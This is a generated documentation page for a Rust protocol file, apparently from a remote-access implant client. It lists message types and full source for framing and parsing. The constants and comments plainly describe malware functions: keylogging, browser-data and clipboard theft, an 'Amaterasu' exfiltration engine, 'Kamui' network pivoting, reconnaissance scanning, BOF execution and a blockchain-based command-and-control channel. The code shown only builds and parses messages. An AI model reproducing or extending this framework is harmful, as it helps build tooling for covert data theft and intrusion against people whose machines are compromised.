# protocol

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/protocol.rs` |
| **Lines** | 316 |
| **Cards** | T019-networking |
| **Role** | Binary protocol, 40+ message types |

## Constants

- `MSG_FRAME`: `u8` = `0x01`
- `MSG_HELLO`: `u8` = `0x02`
- `MSG_STATE_SYNC`: `u8` = `0x04`
- `MSG_PONG`: `u8` = `0x05`
- `MSG_DIRTY_FRAME`: `u8` = `0x06`
- `MSG_VIDEO_FRAME`: `u8` = `0x07`
- `MSG_CMD_OUTPUT`: `u8` = `0x08`
- `MSG_PROCESS_LIST`: `u8` = `0x0A`
- `MSG_CLIPBOARD_CHANGE`: `u8` = `0x0B`
- `MSG_KEYLOG`: `u8` = `0x0C`
- `MSG_BROWSER_DATA`: `u8` = `0x0D`
- `MSG_VNC_DATA`: `u8` = `0x0E`
- `MSG_COMMAND`: `u8` = `0x10`
- `MSG_PING`: `u8` = `0x11`
- `MSG_JUUBI_HELLO`: `u8` = `0x60`
- `MSG_JUUBI_PEER_LIST`: `u8` = `0x61`
- `MSG_JUUBI_OPEN`: `u8` = `0x62`
- `MSG_JUUBI_DATA`: `u8` = `0x63`
- `MSG_JUUBI_CLOSE`: `u8` = `0x64`
- `MSG_JUUBI_ACK`: `u8` = `0x65`
- `MSG_JUUBI_FAILOVER`: `u8` = `0x66`
- `MSG_JUUBI_CAP_ADVERTISE`: `u8` = `0x67`
- `MSG_JUUBI_AUTH_CHALL`: `u8` = `0x68`
- `MSG_JUUBI_AUTH_RESP`: `u8` = `0x69`
- `MSG_JUUBI_TOPO_DELTA`: `u8` = `0x6A`
- `MSG_AMATERASU_CHUNK`: `u8` = `0x20` — [4B job_id][4B offset][chunk_data]
- `MSG_AMATERASU_HARVEST`: `u8` = `0x21` — JSON {job_id, harvest_type, data}
- `MSG_AMATERASU_LS`: `u8` = `0x22` — JSON {request_id, path, entries[]}
- `MSG_AMATERASU_ERROR`: `u8` = `0x23` — JSON {job_id, error}
- `MSG_KAMUI_TCP_DATA`: `u8` = `0x30` — [4B stream_id][data]
- `MSG_KAMUI_TCP_OPEN`: `u8` = `0x31` — JSON {stream_id, host, port}
- `MSG_KAMUI_TCP_CLOSE`: `u8` = `0x32` — JSON {stream_id, reason?}
- `MSG_KAMUI_TCP_PAUSE`: `u8` = `0x33` — JSON {stream_id}
- `MSG_KAMUI_TCP_RESUME`: `u8` = `0x34` — JSON {stream_id}
- `MSG_KAMUI_TCP_ERROR`: `u8` = `0x35` — JSON {stream_id, error}
- `MSG_KAMUI_UDP_BIND`: `u8` = `0x36` — JSON {relay_id, bind_port}
- `MSG_KAMUI_UDP_DATA`: `u8` = `0x37` — [4B relay_id][2B src_port BE][data]
- `MSG_KAMUI_UDP_CLOSE`: `u8` = `0x38` — JSON {relay_id}
- `MSG_KAMUI_CHAIN_DATA`: `u8` = `0x39` — [4B chain_stream_id][data]
- `MSG_BYAKUGAN_SCAN_RESULT`: `u8` = `0x40` — JSON {scan_id, scan_type, data}
- `MSG_BYAKUGAN_HOST`: `u8` = `0x41` — JSON {scan_id, host: {ip, mac, ...}}
- `MSG_BYAKUGAN_ERROR`: `u8` = `0x42` — JSON {scan_id, error}
- `MSG_KOTOAMATSUKAMI_OUTPUT`: `u8` = `0x50`
- `MSG_CHAIN_CONFIG`: `u8` = `0x6B` — Server → Client: JSON {registryAddress, ravenContract, chainId}
- `MSG_CHAIN_FUNDED`: `u8` = `0x6C` — Server → Client: JSON {txHash, amount}
- `MSG_CHAIN_STATUS`: `u8` = `0x6D` — Client → Server: JSON {wallet, registered, peers, lastBlock}

## Public API

### `build_message` (line 67)
```rust
pub fn build_message(msg_type: u8, payload: &[u8]) -> Vec<u8>
```
Build a binary protocol message: [type][4B len BE][payload]

### `parse_message` (line 78)
```rust
pub fn parse_message(data: &[u8]) -> anyhow::Result<(u8, Vec<u8>)>
```
Parse a binary protocol message from raw bytes.
Returns (msg_type, payload_bytes) or an error.

## Internal Functions

- `test_build_message_frame_hello_payload` (line 102)
- `test_build_message_empty_payload` (line 118)
- `test_build_message_large_payload` (line 129)
- `test_parse_message_roundtrip` (line 142)
- `test_parse_message_too_short` (line 153)
- `test_parse_message_truncated_payload` (line 164)
- `test_parse_message_exact_length` (line 177)
- `test_all_msg_constants_are_unique` (line 189)
- `test_specific_constant_values` (line 260)
- `test_namespace_ranges_no_overlap` (line 269)

## Key Dependencies

- `use super::*;`

## Full Source

```rust
// Binary protocol constants and message builders/parsers
// Message format: [1 byte type][4 bytes length big-endian][payload]

// Client → Server message types
pub const MSG_FRAME: u8 = 0x01;
pub const MSG_HELLO: u8 = 0x02;
pub const MSG_STATE_SYNC: u8 = 0x04;
pub const MSG_PONG: u8 = 0x05;
pub const MSG_DIRTY_FRAME: u8 = 0x06;
pub const MSG_VIDEO_FRAME: u8 = 0x07;
pub const MSG_CMD_OUTPUT: u8 = 0x08;
pub const MSG_PROCESS_LIST: u8 = 0x0A;
pub const MSG_CLIPBOARD_CHANGE: u8 = 0x0B;
pub const MSG_KEYLOG: u8 = 0x0C;
pub const MSG_BROWSER_DATA: u8 = 0x0D;
pub const MSG_VNC_DATA: u8 = 0x0E;

// Server → Client message types
pub const MSG_COMMAND: u8 = 0x10;
pub const MSG_PING: u8 = 0x11;

// Juubi (十尾) relay message types
pub const MSG_JUUBI_HELLO: u8 = 0x60;
pub const MSG_JUUBI_PEER_LIST: u8 = 0x61;
pub const MSG_JUUBI_OPEN: u8 = 0x62;
pub const MSG_JUUBI_DATA: u8 = 0x63;
pub const MSG_JUUBI_CLOSE: u8 = 0x64;
pub const MSG_JUUBI_ACK: u8 = 0x65;
pub const MSG_JUUBI_FAILOVER: u8 = 0x66;
pub const MSG_JUUBI_CAP_ADVERTISE: u8 = 0x67;
pub const MSG_JUUBI_AUTH_CHALL: u8 = 0x68;
pub const MSG_JUUBI_AUTH_RESP: u8 = 0x69;
pub const MSG_JUUBI_TOPO_DELTA: u8 = 0x6A;

// Amaterasu (天照) — exfiltration engine
pub const MSG_AMATERASU_CHUNK: u8 = 0x20;    // [4B job_id][4B offset][chunk_data]
pub const MSG_AMATERASU_HARVEST: u8 = 0x21;  // JSON {job_id, harvest_type, data}
pub const MSG_AMATERASU_LS: u8 = 0x22;       // JSON {request_id, path, entries[]}
pub const MSG_AMATERASU_ERROR: u8 = 0x23;    // JSON {job_id, error}

// Kamui (神威) — network pivoting engine
pub const MSG_KAMUI_TCP_DATA: u8 = 0x30;     // [4B stream_id][data]
pub const MSG_KAMUI_TCP_OPEN: u8 = 0x31;     // JSON {stream_id, host, port}
pub const MSG_KAMUI_TCP_CLOSE: u8 = 0x32;    // JSON {stream_id, reason?}
pub const MSG_KAMUI_TCP_PAUSE: u8 = 0x33;    // JSON {stream_id}
pub const MSG_KAMUI_TCP_RESUME: u8 = 0x34;   // JSON {stream_id}
pub const MSG_KAMUI_TCP_ERROR: u8 = 0x35;    // JSON {stream_id, error}
pub const MSG_KAMUI_UDP_BIND: u8 = 0x36;     // JSON {relay_id, bind_port}
pub const MSG_KAMUI_UDP_DATA: u8 = 0x37;     // [4B relay_id][2B src_port BE][data]
pub const MSG_KAMUI_UDP_CLOSE: u8 = 0x38;    // JSON {relay_id}
pub const MSG_KAMUI_CHAIN_DATA: u8 = 0x39;   // [4B chain_stream_id][data]

// Byakugan (白眼) — 360° network reconnaissance
pub const MSG_BYAKUGAN_SCAN_RESULT: u8 = 0x40;  // JSON {scan_id, scan_type, data}
pub const MSG_BYAKUGAN_HOST: u8 = 0x41;          // JSON {scan_id, host: {ip, mac, ...}}
pub const MSG_BYAKUGAN_ERROR: u8 = 0x42;         // JSON {scan_id, error}

// Kotoamatsukami (別天津神) — BOF execution engine
pub const MSG_KOTOAMATSUKAMI_OUTPUT: u8 = 0x50;

// Blockchain C2 — chain config + funding notifications
pub const MSG_CHAIN_CONFIG: u8 = 0x6B;   // Server → Client: JSON {registryAddress, ravenContract, chainId}
pub const MSG_CHAIN_FUNDED: u8 = 0x6C;   // Server → Client: JSON {txHash, amount}
pub const MSG_CHAIN_STATUS: u8 = 0x6D;   // Client → Server: JSON {wallet, registered, peers, lastBlock}

/// Build a binary protocol message: [type][4B len BE][payload]
pub fn build_message(msg_type: u8, payload: &[u8]) -> Vec<u8> {
    let mut msg = Vec::with_capacity(5 + payload.len());
    msg.push(msg_type);
    let len = payload.len() as u32;
    msg.extend_from_slice(&len.to_be_bytes());
    msg.extend_from_slice(payload);
    msg
}

/// Parse a binary protocol message from raw bytes.
/// Returns (msg_type, payload_bytes) or an error.
pub fn parse_message(data: &[u8]) -> anyhow::Result<(u8, Vec<u8>)> {
    if data.len() < 5 {
        anyhow::bail!("Message too short: {} bytes", data.len());
    }
    let msg_type = data[0];
    let length = u32::from_be_bytes([data[1], data[2], data[3], data[4]]) as usize;
    let end = 5 + length;
    if data.len() < end {
        anyhow::bail!(
            "Message payload truncated: need {} bytes, got {}",
            end,
            data.len()
        );
    }
    Ok((msg_type, data[5..end].to_vec()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    // ── 1. build_message with type=0x01 and "hello" payload ─────────────────
    #[test]
    fn test_build_message_frame_hello_payload() {
        let payload = b"hello";
        let msg = build_message(MSG_FRAME, payload);

        // Total length: 1 (type) + 4 (len) + 5 (payload) = 10
        assert_eq!(msg.len(), 10);
        // First byte is the message type
        assert_eq!(msg[0], 0x01);
        // Bytes 1-4 are the big-endian length of the payload (5)
        assert_eq!(&msg[1..5], &[0x00, 0x00, 0x00, 0x05]);
        // Remaining bytes are the payload itself
        assert_eq!(&msg[5..], b"hello");
    }

    // ── 2. build_message with empty payload — length field is 0 ─────────────
    #[test]
    fn test_build_message_empty_payload() {
        let msg = build_message(MSG_PONG, b"");

        assert_eq!(msg.len(), 5);
        assert_eq!(msg[0], MSG_PONG);
        // Length field must be four zero bytes
        assert_eq!(&msg[1..5], &[0x00, 0x00, 0x00, 0x00]);
    }

    // ── 3. build_message with large payload (1000 bytes) ────────────────────
    #[test]
    fn test_build_message_large_payload() {
        let payload: Vec<u8> = (0u8..=255).cycle().take(1000).collect();
        let msg = build_message(MSG_FRAME, &payload);

        assert_eq!(msg.len(), 1005);
        assert_eq!(msg[0], MSG_FRAME);
        // 1000 == 0x000003E8
        assert_eq!(&msg[1..5], &[0x00, 0x00, 0x03, 0xE8]);
        assert_eq!(&msg[5..], payload.as_slice());
    }

    // ── 4. parse_message roundtrip ───────────────────────────────────────────
    #[test]
    fn test_parse_message_roundtrip() {
        let payload = b"roundtrip-test";
        let raw = build_message(MSG_HELLO, payload);
        let (msg_type, recovered) = parse_message(&raw).expect("roundtrip should succeed");

        assert_eq!(msg_type, MSG_HELLO);
        assert_eq!(recovered.as_slice(), payload.as_slice());
    }

    // ── 5. parse_message with data < 5 bytes returns error ──────────────────
    #[test]
    fn test_parse_message_too_short() {
        // Try various lengths below the 5-byte header minimum
        for len in 0usize..5 {
            let data = vec![0xFFu8; len];
            let result = parse_message(&data);
            assert!(result.is_err(), "expected error for {len}-byte input");
        }
    }

    // ── 6. parse_message with truncated payload returns error ────────────────
    #[test]
    fn test_parse_message_truncated_payload() {
        // Build a well-formed header that claims 100-byte payload, but provide only 10
        let mut data = Vec::with_capacity(15);
        data.push(MSG_CMD_OUTPUT);         // type byte
        data.extend_from_slice(&100u32.to_be_bytes()); // length = 100
        data.extend_from_slice(&[0xABu8; 10]);         // only 10 bytes of payload

        let result = parse_message(&data);
        assert!(result.is_err(), "expected error for truncated payload");
    }

    // ── 7. parse_message with exact length succeeds ──────────────────────────
    #[test]
    fn test_parse_message_exact_length() {
        let payload = b"exact";
        let raw = build_message(MSG_STATE_SYNC, payload);
        // raw has exactly 5 + 5 = 10 bytes; parse must succeed
        let (msg_type, body) = parse_message(&raw).expect("exact-length parse should succeed");

        assert_eq!(msg_type, MSG_STATE_SYNC);
        assert_eq!(body.as_slice(), payload.as_slice());
    }

    // ── 8. All MSG_* constants are unique ────────────────────────────────────
    #[test]
    fn test_all_msg_constants_are_unique() {
        // Every MSG_* constant defined in this module
        let constants: &[u8] = &[
            // Client → Server
            MSG_FRAME,
            MSG_HELLO,
            MSG_STATE_SYNC,
            MSG_PONG,
            MSG_DIRTY_FRAME,
            MSG_VIDEO_FRAME,
            MSG_CMD_OUTPUT,
            MSG_PROCESS_LIST,
            MSG_CLIPBOARD_CHANGE,
            MSG_KEYLOG,
            MSG_BROWSER_DATA,
            MSG_VNC_DATA,
            // Server → Client
            MSG_COMMAND,
            MSG_PING,
            // Amaterasu
            MSG_AMATERASU_CHUNK,
            MSG_AMATERASU_HARVEST,
            MSG_AMATERASU_LS,
            MSG_AMATERASU_ERROR,
            // Kamui
            MSG_KAMUI_TCP_DATA,
            MSG_KAMUI_TCP_OPEN,
            MSG_KAMUI_TCP_CLOSE,
            MSG_KAMUI_TCP_PAUSE,
            MSG_KAMUI_TCP_RESUME,
            MSG_KAMUI_TCP_ERROR,
            MSG_KAMUI_UDP_BIND,
            MSG_KAMUI_UDP_DATA,
            MSG_KAMUI_UDP_CLOSE,
            MSG_KAMUI_CHAIN_DATA,
            // Byakugan
            MSG_BYAKUGAN_SCAN_RESULT,
            MSG_BYAKUGAN_HOST,
            MSG_BYAKUGAN_ERROR,
            // Kotoamatsukami
            MSG_KOTOAMATSUKAMI_OUTPUT,
            // Juubi
            MSG_JUUBI_HELLO,
            MSG_JUUBI_PEER_LIST,
            MSG_JUUBI_OPEN,
            MSG_JUUBI_DATA,
            MSG_JUUBI_CLOSE,
            MSG_JUUBI_ACK,
            MSG_JUUBI_FAILOVER,
            MSG_JUUBI_CAP_ADVERTISE,
            MSG_JUUBI_AUTH_CHALL,
            MSG_JUUBI_AUTH_RESP,
            MSG_JUUBI_TOPO_DELTA,
            // Blockchain C2
            MSG_CHAIN_CONFIG,
            MSG_CHAIN_FUNDED,
            MSG_CHAIN_STATUS,
        ];

        let unique: HashSet<u8> = constants.iter().copied().collect();
        assert_eq!(
            unique.len(),
            constants.len(),
            "duplicate MSG_* constant value detected (unique={}, total={})",
            unique.len(),
            constants.len()
        );
    }

    // ── 9. Verify specific constant values from the protocol spec ────────────
    #[test]
    fn test_specific_constant_values() {
        assert_eq!(MSG_FRAME,   0x01, "MSG_FRAME must be 0x01");
        assert_eq!(MSG_HELLO,   0x02, "MSG_HELLO must be 0x02");
        assert_eq!(MSG_COMMAND, 0x10, "MSG_COMMAND must be 0x10");
        assert_eq!(MSG_PING,    0x11, "MSG_PING must be 0x11");
    }

    // ── 10. Namespace ranges do not overlap ──────────────────────────────────
    #[test]
    fn test_namespace_ranges_no_overlap() {
        let client_to_server: HashSet<u8> = [
            MSG_FRAME, MSG_HELLO, MSG_STATE_SYNC, MSG_PONG, MSG_DIRTY_FRAME,
            MSG_VIDEO_FRAME, MSG_CMD_OUTPUT, MSG_PROCESS_LIST, MSG_CLIPBOARD_CHANGE,
            MSG_KEYLOG, MSG_BROWSER_DATA, MSG_VNC_DATA,
        ]
        .iter()
        .copied()
        .collect();

        let server_to_client: HashSet<u8> = [MSG_COMMAND, MSG_PING]
            .iter()
            .copied()
            .collect();

        let subsystems: HashSet<u8> = [
            // Amaterasu 0x20-0x23
            MSG_AMATERASU_CHUNK, MSG_AMATERASU_HARVEST, MSG_AMATERASU_LS, MSG_AMATERASU_ERROR,
            // Kamui 0x30-0x39
            MSG_KAMUI_TCP_DATA, MSG_KAMUI_TCP_OPEN, MSG_KAMUI_TCP_CLOSE, MSG_KAMUI_TCP_PAUSE,
            MSG_KAMUI_TCP_RESUME, MSG_KAMUI_TCP_ERROR, MSG_KAMUI_UDP_BIND, MSG_KAMUI_UDP_DATA,
            MSG_KAMUI_UDP_CLOSE, MSG_KAMUI_CHAIN_DATA,
            // Byakugan 0x40-0x42
            MSG_BYAKUGAN_SCAN_RESULT, MSG_BYAKUGAN_HOST, MSG_BYAKUGAN_ERROR,
            // Kotoamatsukami 0x50
            MSG_KOTOAMATSUKAMI_OUTPUT,
            // Juubi 0x60-0x6A
            MSG_JUUBI_HELLO, MSG_JUUBI_PEER_LIST, MSG_JUUBI_OPEN, MSG_JUUBI_DATA,
            MSG_JUUBI_CLOSE, MSG_JUUBI_ACK, MSG_JUUBI_FAILOVER, MSG_JUUBI_CAP_ADVERTISE,
            MSG_JUUBI_AUTH_CHALL, MSG_JUUBI_AUTH_RESP, MSG_JUUBI_TOPO_DELTA,
            // Blockchain C2 0x6B-0x6D
            MSG_CHAIN_CONFIG, MSG_CHAIN_FUNDED, MSG_CHAIN_STATUS,
        ]
        .iter()
        .copied()
        .collect();

        // Each pair of namespaces must be disjoint
        let c2s_vs_s2c: HashSet<u8> = client_to_server.intersection(&server_to_client).copied().collect();
        assert!(c2s_vs_s2c.is_empty(), "client→server and server→client ranges overlap: {c2s_vs_s2c:?}");

        let c2s_vs_sub: HashSet<u8> = client_to_server.intersection(&subsystems).copied().collect();
        assert!(c2s_vs_sub.is_empty(), "client→server and subsystem ranges overlap: {c2s_vs_sub:?}");

        let s2c_vs_sub: HashSet<u8> = server_to_client.intersection(&subsystems).copied().collect();
        assert!(s2c_vs_sub.is_empty(), "server→client and subsystem ranges overlap: {s2c_vs_sub:?}");
    }
}

```